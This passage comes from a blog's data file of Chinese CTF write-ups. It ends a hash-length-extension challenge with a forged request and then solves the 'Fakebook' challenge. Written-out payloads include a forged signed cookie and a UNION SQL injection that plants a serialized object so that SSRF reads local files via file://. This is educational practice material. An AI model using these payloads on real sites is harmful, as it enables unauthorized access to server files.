class=\"line\">46a6ff04f7bede58de30e93410935976 #生成的MD5</span><br><span class=\"line\">scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p><code>burp suite</code>提交的数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie:action&#x3D;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign&#x3D;46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>\n\n<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n&quot;}</code></p>"},{"title":"buuoj刷题记录5","date":"2019-12-30T08:19:44.000Z","_content":"\n## [网鼎杯 2018]Fakebook\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\n<!--more-->\n\n### 0x01 分析\n\n访问`robots.txt`，给了一个提示\n\n```\nUser-agent: *\nDisallow: /user.php.bak\n```\n\n拿到`user.php`的源码\n\n```\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();   //初始化链接\n\n        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出\n        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);  //获取博客地址\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);  //博客地址有过滤\n    }\n\n}\n```\n\n访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。\n\n在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入\n\n### 0x02 开始操作\n\n使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。\n\n![](/pic/4.png)\n```\npayload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3{s:4:\"name\";s:4:\"and\";s:3:\"age\";i:12;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'\n```\n\n执行结果\n\n![](/pic/5.png)\n\n查看源码\n\n```html\n<!doctype html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>User</title>\n\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\n</head>\n<body>\n<div class=\"container\">\n    <table class=\"table\">\n        <tr>\n            <th>\n                username\n            </th>\n            <th>\n                age\n            </th>\n            <th>\n                blog\n            </th>\n        </tr>\n        <tr>\n            <td>\n                2            </td>\n            <td>\n                12            </td>\n            <td>\n                file:///var/www/html/flag.php            </td>\n        </tr>\n    </table>\n\n    <hr>\n    <br><br><br><br><br>\n    <p>the contents of his/her blog</p>\n    <hr>\n    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>\n</div>\n</body>\n</html>\n```\n\n点击即可看见flag\n\n```php\n<?php\n\n$flag = \"flag{835065b6-b60d-49da-a92b-dd80d38032dc}\";\nexit(0);\n\n```\n\n","source":"_posts/buuoj刷题记录5.md","raw":"---\ntitle: buuoj刷题记录5\ndate: 2019-12-30 16:19:44\ntags:\n - 网鼎杯2018\n - buuctf\n - web\n---\n\n## [网鼎杯 2018]Fakebook\n\n### 0x00 基础\n\n一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者`www.zip`等一系列文件中出现网站源码。也可以使用工具扫描\n\n<!--more-->\n\n### 0x01 分析\n\n访问`robots.txt`，给了一个提示\n\n```\nUser-agent: *\nDisallow: /user.php.bak\n```\n\n拿到`user.php`的源码\n\n```\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();   //初始化链接\n\n        curl_setopt($ch, CURLOPT_URL, $url);     //设置CURLOPT_URL\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //将curl_exec()获取的信息以文件流的形式返回,而不是直接输出\n        $output = curl_exec($ch);      /执行CURL会话;此处存在ssrf\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);  //获取博客地址\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);  //博客地址有过滤\n    }\n\n}\n```\n\n访问`flag.php`，显示返回是200。那么应该是要将`./flag.php`写入博客地址，让程序加载。\n\n在加入一个用户时的`username`存在post注入，加入完成，进入到`view.php`发现也存在注入\n\n### 0x02 开始操作\n\n使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。\n\n![](/pic/4.png)\n```\npayload=view.php?no=0/**/union/**/select/**/1,2,3,'O:8:\"UserInfo\":3{s:4:\"name\";s:4:\"and\";s:3:\"age\";i:12;s:4:\"blog\";s:29:\"file:///var/www/html/flag.php\";}'\n```\n\n执行结果\n\n![](/pic/5.png)\n\n查看源码\n\n```html\n<!doctype html>\n<html lang=\"ko\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\"\n          content=\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>User</title>\n\n    <link rel=\"stylesheet\" href=\"css/bootstrap.min.css\" crossorigin=\"anonymous\">\n<script src=\"js/jquery-3.3.1.slim.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/popper.min.js\" crossorigin=\"anonymous\"></script>\n<script src=\"js/bootstrap.min.js\" crossorigin=\"anonymous\"></script>\n</head>\n<body>\n<div class=\"container\">\n    <table class=\"table\">\n        <tr>\n            <th>\n                username\n            </th>\n            <th>\n                age\n            </th>\n            <th>\n                blog\n            </th>\n        </tr>\n        <tr>\n            <td>\n                2            </td>\n            <td>\n                12            </td>\n            <td>\n                file:///var/www/html/flag.php            </td>\n        </tr>\n    </table>\n\n    <hr>\n    <br><br><br><br><br>\n    <p>the contents of his/her blog</p>\n    <hr>\n    <iframe width='100%' height='10em' src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='>\n</div>\n</body>\n</html>\n```\n\n点击即可看见flag\n\n```php\n<?php\n\n$flag = \"flag{835065b6-b60d-49da-a92b-dd80d38032dc}\";\nexit(0);\n\n```\n\n","slug":"buuoj刷题记录5","published":1,"updated":"2020-01-02T06:26:03.823Z","_id":"ck4wcegh50000yo7e74w97qcq","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>拿到<code>user.php</code>的源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class UserInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name &#x3D; &quot;&quot;;</span><br><span class=\"line\">    public $age &#x3D; 0;</span><br><span class=\"line\">    public $blog &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($name, $age, $blog)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;name &#x3D; $name;</span><br><span class=\"line\">        $this-&gt;age &#x3D; (int)$age;</span><br><span class=\"line\">        $this-&gt;blog &#x3D; $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get($url)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch &#x3D; curl_init();   &#x2F;&#x2F;初始化链接</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);     &#x2F;&#x2F;设置CURLOPT_URL</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   &#x2F;&#x2F;将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span><br><span class=\"line\">        $output &#x3D; curl_exec($ch);      &#x2F;执行CURL会话;此处存在ssrf</span><br><span class=\"line\">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class=\"line\">            return 404;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        return $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getBlogContents ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return $this-&gt;get($this-&gt;blog);  &#x2F;&#x2F;获取博客地址</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isValidBlog ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $blog &#x3D; $this-&gt;blog;</span><br><span class=\"line\">        return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog);  &#x2F;&#x2F;博客地址有过滤</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>\n<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>\n<p><img src=\"/pic/4.png\" alt=\"\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>\n\n<p>执行结果</p>\n<p><img src=\"/pic/5.png\" alt=\"\"></p>\n<p>查看源码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!doctype <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">\"ko\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"UTF-8\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">\"viewport\"</span></span></span><br><span class=\"line\"><span class=\"tag\">          <span class=\"attr\">content</span>=<span class=\"string\">\"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">\"X-UA-Compatible\"</span> <span class=\"attr\">content</span>=<span class=\"string\">\"ie=edge\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>User<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"css/bootstrap.min.css\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/jquery-3.3.1.slim.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/popper.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"js/bootstrap.min.js\"</span> <span class=\"attr\">crossorigin</span>=<span class=\"string\">\"anonymous\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">\"container\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">class</span>=<span class=\"string\">\"table\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                username</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                age</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">                blog</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                2            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                12            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">                file:///var/www/html/flag.php            <span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>the contents of his/her blog<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">hr</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">width</span>=<span class=\"string\">'100%'</span> <span class=\"attr\">height</span>=<span class=\"string\">'10em'</span> <span class=\"attr\">src</span>=<span class=\"string\">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>点击即可看见flag</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$flag = <span class=\"string\">\"flag&#123;835065b6-b60d-49da-a92b-dd80d38032dc&#125;\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">exit</span>(<span class=\"number\">0</span>);</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<h2 id=\"网鼎杯-2018-Fakebook\"><a href=\"#网鼎杯-2018-Fakebook\" class=\"headerlink\" title=\"[网鼎杯 2018]Fakebook\"></a>[网鼎杯 2018]Fakebook</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>\n\n<p>拿到<code>user.php</code>的源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">class UserInfo</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    public $name &#x3D; &quot;&quot;;</span><br><span class=\"line\">    public $age &#x3D; 0;</span><br><span class=\"line\">    public $blog &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($name, $age, $blog)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;name &#x3D; $name;</span><br><span class=\"line\">        $this-&gt;age &#x3D; (int)$age;</span><br><span class=\"line\">        $this-&gt;blog &#x3D; $blog;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function get($url)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $ch &#x3D; curl_init();   &#x2F;&#x2F;初始化链接</span><br><span class=\"line\"></span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);     &#x2F;&#x2F;设置CURLOPT_URL</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   &#x2F;&#x2F;将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span><br><span class=\"line\">        $output &#x3D; curl_exec($ch);      &#x2F;执行CURL会话;此处存在ssrf</span><br><span class=\"line\">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class=\"line\">            return 404;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">        return $output;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function getBlogContents ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        return $this-&gt;get($this-&gt;blog);  &#x2F;&#x2F;获取博客地址</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isValidBlog ()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $blog &#x3D; $this-&gt;blog;</span><br><span class=\"line\">        return preg_match(&quot;&#x2F;^(((http(s?))\\:\\&#x2F;\\&#x2F;)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\&#x2F;\\S*)?$&#x2F;i&quot;, $blog);  &#x2F;&#x2F;博客地址有过滤</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span 